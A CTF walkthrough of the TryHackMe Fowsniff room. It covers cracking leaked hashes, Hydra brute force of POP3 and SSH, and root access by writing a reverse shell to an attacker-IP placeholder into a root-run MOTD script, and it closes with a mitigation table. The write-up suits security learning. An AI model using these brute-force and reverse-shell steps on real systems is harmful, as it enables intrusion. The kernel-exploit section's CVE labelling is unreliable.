# TryHackMe — Fowsniff CTF: Full Walkthrough

**Author:** Kyle Tawa  
**Platform:** TryHackMe  
**Room:** [Fowsniff CTF](https://tryhackme.com/room/ctf)  
**Difficulty:** Beginner / Easy  
**Date:** June 2026  

---

## Overview

Fowsniff CTF is a beginner-friendly boot2root challenge created by **@berzerk0** on Twitter. It simulates a **corporate data breach scenario** — a company's Twitter account gets hijacked, sensitive employee credentials are dumped publicly, and an attacker leverages that leaked data to pivot through POP3 email access, SSH, and ultimately gain root-level access.

The attack chain follows four classic penetration testing phases:

1. **Reconnaissance** — Network scanning and web enumeration
2. **Credential Abuse** — Hash cracking, password reuse, and email compromise
3. **Initial Access** — SSH login via credentials discovered in email
4. **Privilege Escalation** — Exploiting a writable MOTD script executed as root

---

## Recon

### Nmap Scan

The first step was a full-service scan against the target to identify open ports and running services.

```bash
nmap -sC -sV -p- -oN nmap.out <TARGET_IP>
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | Open | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 |
| 80/tcp | Open | HTTP | Apache httpd 2.4.18 (Ubuntu) |
| 110/tcp | Open | POP3 | Dovecot pop3d |
| 143/tcp | Open | IMAP | Dovecot imapd |

Four ports were identified — a standard web server (80), SSH remote access (22), and two mail protocols (POP3 on 110, IMAP on 143). The presence of both POP3 and IMAP immediately suggested that email-based attacks would be part of the engagement.

### Web Enumeration

Visiting the web server on port 80 presented the homepage of **Fowsniff Corp**, a fictional IT services company. The site itself was a straightforward HTML page, but the content revealed a critical piece of intelligence:

> The company's official Twitter account **@fowsniffcorp** had been hijacked, and sensitive employee data was leaked publicly.

Checking the Twitter profile for @fowsniffcorp (still accessible during the CTF's lifetime) led to a **Pastebin dump** containing the breached employee credentials.

---

## Data Breach Analysis

### The Pastebin Dump

The Pastebin page (`https://pastebin.com/NrAqVeeX`) contained a list of usernames with what appeared to be MD5 password hashes. Nine employees were listed:

```
mauer@fowsniff:[REDACTED]
mustikka@fowsniff:[REDACTED]
tegel@fowsniff:[REDACTED]
baksteen@fowsniff:[REDACTED]
seina@fowsniff:[REDACTED]
stone@fowsniff:[REDACTED]
mursten@fowsniff:[REDACTED]
parede@fowsniff:[REDACTED]
sciana@fowsniff:[REDACTED]
```

The Pastebin also warned that **the POP3 server was open and accessible** — confirming the attack surface we identified in our nmap scan.

### Cracking the MD5 Hashes

I extracted the hashes into a file and ran **John the Ripper** against the `rockyou.txt` wordlist:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**8 out of 9 hashes cracked successfully:**

| Username | Cracked Password |
|----------|-----------------|
| mauer | mailcall |
| mustikka | bilbo101 |
| tegel | apples01 |
| baksteen | skyler22 |
| seina | scoobydoo2 |
| stone | *(not cracked)* |
| mursten | carp4ever |
| parede | orlando12 |
| sciana | 07011972 |

The user **stone** (the sysadmin) had a password that didn't appear in rockyou.txt, but all other accounts were now recoverable.

### Preparing Attack Lists

I saved the usernames and cracked passwords into separate files for use with brute-forcing tools:

```bash
# users.txt
mauer
mustikka
tegel
baksteen
seina
stone
mursten
parede
sciana

# passwords.txt
mailcall
bilbo101
apples01
skyler22
scoobydoo2
carp4ever
orlando12
07011972
```

---

## Email Compromise

### POP3 Brute Force with Hydra

Since the Pastebin specifically mentioned POP3 access was available, I used **Hydra** to test the cracked credentials against the POP3 service:

```bash
hydra -L users.txt -P passwords.txt pop3://<TARGET_IP>
```

**Result — one valid login found:**

```
[POP3] host: <TARGET_IP>   login: seina   password: scoobydoo2
```

The user **seina** had not changed her email password following the breach announcement.

### Reading Seina's Emails

I connected to the POP3 server using netcat (a lightweight alternative to telnet):

```bash
nc <TARGET_IP> 110
```

```text
+OK Welcome to the Fowsniff Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1360
RETR 1
```

**Email #1 — From: stone@fowsniff (URGENT! Security Event!)**

```
Dear Fowsniff Employees,

We have recently been made aware of a serious security breach
affecting our company's Twitter account and internal systems.

As a precautionary measure, we have issued a TEMPORARY password
that all employees must use for SSH access going forward.

The temporary password is: S1ck3nBluff+secureshell

Please change this password immediately after your first login.

Regards,
Stone
(SysAdmin)
```

This was the jackpot — the sysadmin had sent a mass email with a **temporary SSH password** that all employees were supposed to change, but as we would soon discover, not everyone complied.

**Email #2 — From: baksteen@fowsniff (You missed out!)**

A more personal message from Baksteen (Skyler) telling Seina she should change her email password immediately and that she shouldn't trust the temporary SSH password. This email confirmed the social dynamics among the team and reinforced the non-technical details of the breach.

---

## SSH Access

With the temporary SSH password `S1ck3nBluff+secureshell` in hand, I tested it against all users to see who had not yet changed their password:

```bash
hydra -L users.txt -p S1ck3nBluff+secureshell ssh://<TARGET_IP>
```

**Result:**

```
[SSH] host: <TARGET_IP>   login: baksteen   password: S1ck3nBluff+secureshell
```

The user **baksteen** (Skyler) — ironically the same person who warned Seina in email #2 — had **not changed his own SSH password** from the temporary one. I logged in:

```bash
ssh baksteen@<TARGET_IP>
```

**Initial foothold achieved.**

### User-Level Enumeration

```bash
id
# uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)

sudo -l
# [sudo] password for baksteen: S1ck3nBluff+secureshell
# Sorry, user baksteen may not run sudo on fowsniff.
```

No sudo access — time to look for another privilege escalation vector.

---

## Privilege Escalation

### Finding the MOTD Script

I searched for files writable by the `users` group:

```bash
find / -type f -group users 2>/dev/null
```

**Key finding:** `/opt/cube/cube.sh`

This file was owned by the group `users` and was writable. But what executed it? A quick check of `/etc/update-motd.d/` revealed the answer:

```bash
grep cube /etc/update-motd.d/*
# /etc/update-motd.d/00-header: sh /opt/cube/cube.sh
```

The script `/opt/cube/cube.sh` was called by the **MOTD (Message of the Day)** system — specifically in `00-header`, which runs whenever a user logs in via SSH. Crucially, MOTD scripts execute **as root**.

This is a well-known privilege escalation vector on Linux systems: if an unprivileged user can modify a script that runs in the MOTD pipeline, they can execute arbitrary code with root privileges on the next SSH login.

### Crafting the Exploit

I wrote a reverse shell payload into `/opt/cube/cube.sh`:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > /opt/cube/cube.sh
```

On my attack machine, I started a netcat listener:

```bash
nc -lnvp 4444
```

Then, back on the Fowsniff host, I logged out and reconnected via SSH:

```bash
# On my attack machine — this triggers the MOTD script as root
ssh baksteen@<TARGET_IP>
```

### Root Shell

The SSH login triggered the MOTD banner, which executed our modified `cube.sh` script as **root**, and the reverse shell connected back to my listener:

```bash
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)
```

**Privilege escalation successful.**

---

## Flags

### Root Flag

```bash
cat /root/flag.txt
```

```
   ___                        _        _      _   _             _
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|__\__,_|\__|_\_\/_||_/__(_)
               |___/

Nice work! This CTF was built with love in every byte by @berzerk0 on Twitter.
```

### Alternative: Kernel Exploit (CVE-2017-16651 / Dirty COW variant)

Some walkthroughs also mention a kernel-based privilege escalation path. The target runs **Linux kernel 4.4.0**, which is vulnerable to several local privilege escalation exploits (e.g., exploit `44298.c` from ExploitDB). This provides an alternative escalation route if the MOTD script is not available:

```bash
# Transfer and compile the exploit on the target
gcc 44298.c -o exploit
./exploit
# Drops a root shell
```

However, the **MOTD script method is the intended path** for this CTF and is more elegant — it teaches a valuable real-world lesson about writable system scripts.

---

## Lessons Learned

| Vulnerability | Mitigation |
|--------------|------------|
| **Leaked credentials via social media** | Never store password hashes in public pastebins; have a breach response plan |
| **Weak MD5 hashes** | Use salted, slow hashing algorithms (bcrypt, Argon2, scrypt) |
| **POP3 exposed without rate limiting** | Use secure protocols (IMAPS/POPS) and rate-limit authentication attempts |
| **Temporary password reuse** | Force password change on first login; never allow shared temporary passwords |
| **Writable MOTD script** | Restrict write permissions on `/etc/update-motd.d/` scripts and files called by them |
| **No email password change after breach announcement** | Enforce mandatory password rotation after a security incident |

### Key Takeaways

1. **Public information gathering is critical** — The entire attack chain started from a Twitter account mentioned on a company website. A breached social media account can lead directly to system compromise.

2. **Password reuse is the attacker's best friend** — The same cracked passwords that worked for POP3 could have been tried against SSH. Even within the same company, credential reuse across services (email vs. SSH) is a common weakness.

3. **Email is a high-value target** — Once we accessed Seina's mailbox, we found the SSH keys to the kingdom. Organizations must treat email with the highest security priority.

4. **MOTD scripts run as root** — This is a lesser-known but powerful privilege escalation vector. Any file referenced by the MOTD chain that is writable by a non-root user presents an immediate path to root.

5. **Temporary passwords are dangerous** — The temporary SSH password was sent in plaintext via email and never rotated. Always enforce change-on-first-use for temporary credentials.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port and service discovery |
| John the Ripper | MD5 password hash cracking |
| Hydra | POP3 and SSH brute-force authentication |
| Netcat | POP3 email retrieval and reverse shell listener |
| Bash | Reverse shell payload and local enumeration |

---

*This write-up is based on Kyle's lab experience with the TryHackMe Fowsniff CTF room. The vulnerable machine was created by @berzerk0 and is available on the TryHackMe platform at [https://tryhackme.com/room/ctf](https://tryhackme.com/room/ctf).*
